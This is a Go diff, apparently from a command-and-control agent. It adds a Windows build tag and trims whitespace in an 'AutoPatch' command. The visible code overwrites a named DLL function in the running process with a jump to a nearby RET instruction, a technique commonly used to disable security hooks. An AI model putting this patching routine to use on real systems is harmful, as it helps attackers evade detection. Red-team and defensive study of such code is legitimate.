@@ -1,3 +1,4 @@
+//go:build windows
 // +build windows
 
 package commands
@@ -82,13 +83,13 @@ func (c *AutoPatchCommand) Execute(task structs.Task) structs.CommandResult {
 	// Read memory around the function address
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
 	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
-	
+
 	currentProcess, _ := syscall.GetCurrentProcess()
 	var bytesRead uintptr
-	
+
 	// Read from (functionAddress - numBytes) forward
 	targetAddress := uintptr(functionAddress) - uintptr(args.NumBytes)
-	
+
 	ret, _, err := readProcessMemory.Call(
 		uintptr(currentProcess),
 		targetAddress,
@@ -128,7 +129,7 @@ func (c *AutoPatchCommand) Execute(task structs.Task) structs.CommandResult {
 	// Determine jump instruction (short JMP or near JMP)
 	var jumpOp []byte
 	var jumpType string
-	
+
 	if offset >= -128 && offset <= 127 {
 		// Short JMP (EB XX)
 		jumpOp = []byte{0xEB, byte(offset - 2)}
@@ -148,7 +149,7 @@ func (c *AutoPatchCommand) Execute(task structs.Task) structs.CommandResult {
 	// Write jump instruction
 	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
 	var bytesWritten uintptr
-	
+
 	ret, _, err = writeProcessMemory.Call(
 		uintptr(currentProcess),
 		uintptr(functionAddress),
@@ -166,7 +167,7 @@ func (c *AutoPatchCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	c3Address := targetAddress + uintptr(c3Index)
-	
+
 	output := fmt.Sprintf("AutoPatch applied successfully!\n")
 	output += fmt.Sprintf("Function: %s!%s at 0x%x\n", args.DllName, args.FunctionName, functionAddress)
 	output += fmt.Sprintf("Found C3 at offset %d (0x%x)\n", offset, c3Address)
